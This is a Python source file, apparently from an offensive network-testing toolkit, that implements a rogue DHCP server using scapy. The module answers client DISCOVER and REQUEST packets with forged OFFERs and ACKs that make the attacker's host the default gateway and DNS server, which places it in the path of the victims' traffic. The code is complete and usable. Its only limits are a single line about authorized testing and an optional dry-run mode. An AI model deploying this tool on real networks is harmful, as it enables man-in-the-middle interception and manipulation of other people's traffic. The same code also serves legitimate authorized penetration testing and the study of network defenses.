"""Rogue DHCP server: answer client DISCOVERs with an offer that points at the attacker.

A DHCP client accepts the first OFFER it receives, and then sends a REQUEST for the
server it chose. A host that answers first, with a gateway and DNS server of its
own, becomes the configuration source of that client. The client's traffic can then
pass through the attacker.

This module answers DISCOVER with OFFER and REQUEST with ACK, for requests addressed
to its own server identifier. It does not manage a pool or track leases.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import ipaddress
import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import BOOTP, DHCP, IP, UDP, AsyncSniffer, Ether, sendp
from scapy.packet import Packet

from macabre.attacks.common import BROADCAST_MAC, Runner, read_interface_mac, run_command

SERVER_PORT = 67
CLIENT_PORT = 68
LEASE_SECONDS = 3600
_MESSAGE_TYPE_NAMES = {1: "discover", 2: "offer", 3: "request", 5: "ack"}


def _ipv4(value: str, name: str) -> str:
    try:
        return str(ipaddress.IPv4Address(value))
    except ValueError as exc:
        raise ValueError(f"{name} must be an IPv4 address.") from exc


@dataclass(frozen=True)
class RogueDhcpConfig:
    iface: str                       # attacker interface, on the segment with the clients
    server_ip: str                   # this server's address: server identifier, default router and DNS
    offer_ip: str                    # address offered to clients
    subnet_mask: str = "255.255.255.0"
    router: str = ""                 # default gateway offered; empty = server_ip
    dns: str = ""                    # DNS server offered; empty = server_ip
    lease_time: int = LEASE_SECONDS
    dry_run: bool = False            # validate and describe, but do not listen or send
    extra_options: tuple = ()       # (code, value) options added to every OFFER and ACK

    def __post_init__(self) -> None:
        _ipv4(self.server_ip, "Server address")
        _ipv4(self.offer_ip, "Offered address")
        _ipv4(self.subnet_mask, "Subnet mask")
        if self.router:
            _ipv4(self.router, "Router")
        if self.dns:
            _ipv4(self.dns, "DNS server")
        if self.lease_time <= 0:
            raise ValueError("Lease time must be positive.")

    @property
    def effective_router(self) -> str:
        return self.router or self.server_ip

    @property
    def effective_dns(self) -> str:
        return self.dns or self.server_ip


@dataclass
class RogueDhcpStats:
    server_mac: str = ""
    discovers: int = 0
    offers: int = 0
    requests: int = 0
    acks: int = 0
    status: str = ""


def _message_type(packet: Packet) -> str | None:
    for option in packet[DHCP].options:
        if isinstance(option, tuple) and len(option) == 2 and option[0] == "message-type":
            value = option[1]
            return _MESSAGE_TYPE_NAMES.get(value, value) if isinstance(value, int) else value
    return None


def _option(packet: Packet, name: str) -> Any:
    for option in packet[DHCP].options:
        if isinstance(option, tuple) and len(option) == 2 and option[0] == name:
            return option[1]
    return None


def _reply(config: RogueDhcpConfig, sender_mac: str, request: Packet, options: list) -> Packet:
    bootp = request[BOOTP]
    return (
        Ether(src=sender_mac, dst=BROADCAST_MAC)
        / IP(src=config.server_ip, dst="255.255.255.255")
        / UDP(sport=SERVER_PORT, dport=CLIENT_PORT)
        / BOOTP(
            op=2,
            xid=bootp.xid,
            yiaddr=config.offer_ip,
            siaddr=config.server_ip,
            chaddr=bootp.chaddr,
            flags=bootp.flags,
        )
        / DHCP(options=options)
    )


def build_offer(config: RogueDhcpConfig, sender_mac: str, discover: Packet) -> Packet:
    """DHCPOFFER answering `discover`, with this server as the gateway and DNS."""
    return _reply(config, sender_mac, discover, [
        ("message-type", "offer"),
        ("server_id", config.server_ip),
        ("lease_time", config.lease_time),
        ("subnet_mask", config.subnet_mask),
        ("router", config.effective_router),
        ("name_server", config.effective_dns),
        *config.extra_options,
        "end",
    ])


def build_ack(config: RogueDhcpConfig, sender_mac: str, request: Packet, granted_ip: str) -> Packet:
    """DHCPACK confirming `granted_ip` to the client that sent `request`."""
    return _reply(config, sender_mac, request, [
        ("message-type", "ack"),
        ("server_id", config.server_ip),
        ("lease_time", config.lease_time),
        ("subnet_mask", config.subnet_mask),
        ("router", config.effective_router),
        ("name_server", config.effective_dns),
        *config.extra_options,
        "end",
    ])


def respond(config: RogueDhcpConfig, sender_mac: str, packet: Packet) -> tuple[str, Packet] | None:
    """Return ("offer" | "ack", reply) for a client packet this server answers, otherwise None.

    A REQUEST is answered only when it names this server as its server identifier,
    so the client has chosen this server and not another one.
    """
    if not (packet.haslayer(DHCP) and packet.haslayer(BOOTP)):
        return None
    if packet[BOOTP].op != 1 or packet.src == sender_mac:
        return None
    kind = _message_type(packet)
    if kind == "discover":
        return "offer", build_offer(config, sender_mac, packet)
    if kind == "request" and _option(packet, "server_id") == config.server_ip:
        granted = _option(packet, "requested_addr") or config.offer_ip
        return "ack", build_ack(config, sender_mac, packet, granted)
    return None


def run_rogue_dhcp(
    config: RogueDhcpConfig,
    stop_event: threading.Event,
    on_progress: Callable[[RogueDhcpStats], None],
    run: Runner | None = None,
    send: Callable[..., Any] | None = None,
    sniffer_factory: Callable[..., Any] = AsyncSniffer,
) -> RogueDhcpStats:
    """Answer DHCP clients on the interface until `stop_event` is set."""
    run = run or run_command
    send = send or sendp

    if config.dry_run:
        stats = RogueDhcpStats(
            status=(
                f"Dry run: would answer DHCP clients with offers for {config.offer_ip} from "
                f"{config.server_ip}, router {config.effective_router}. Nothing sent."
            ),
        )
        on_progress(replace(stats))
        return stats

    sender_mac = read_interface_mac(config.iface, run)
    stats = RogueDhcpStats(server_mac=sender_mac)
    lock = threading.Lock()

    def on_packet(packet: Packet) -> None:
        reply = respond(config, sender_mac, packet)
        if reply is None:
            return
        kind, frame = reply
        with lock:
            if kind == "offer":
                stats.discovers += 1
                stats.offers += 1
            else:
                stats.requests += 1
                stats.acks += 1
            snapshot = replace(stats)
        send(frame, iface=config.iface, verbose=False)
        on_progress(snapshot)

    sniffer = sniffer_factory(iface=config.iface, store=False, prn=on_packet)
    sniffer.start()
    try:
        stop_event.wait()
    finally:
        sniffer.stop()
    return stats
